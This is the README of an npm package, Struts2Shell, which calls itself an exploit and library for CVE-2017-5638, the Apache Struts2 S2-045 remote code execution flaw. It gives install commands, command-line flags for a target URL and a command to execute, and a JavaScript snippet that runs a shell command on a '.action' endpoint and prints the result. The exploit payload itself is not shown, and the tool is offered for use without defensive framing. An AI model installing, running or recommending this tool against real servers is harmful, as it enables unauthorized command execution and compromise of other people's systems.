# Struts2Shell

An exploit (and library) for CVE-2017-5638 - Apache Struts2 S2-045 bug.

## Installation

```sh
$ npm install -g struts2shell
```

## Installation as Library

```sh
$ npm install struts2shell
```

## Command Line Options
    -h, --help           output usage information
    -V, --version        output the version number
    -u, --url [target]   URL to Attack
    -c, --cmd [command]  Command to Execute

## Usage as Library

```javascript
var Struts2Shell = require('struts2shell');
Struts2Shell({
	URL: 'http://example.com/some.action',
	CMD: 'dir'
}, function(err, response,body) {
    if(err) throw err;
    console.log(body)
})
```

## Screenshot

![Struts2Shell](https://raw.githubusercontent.com/jpacora/Struts2Shell/master/screenshot.png)


License
----

MIT


**Free Software, Hell Yeah!**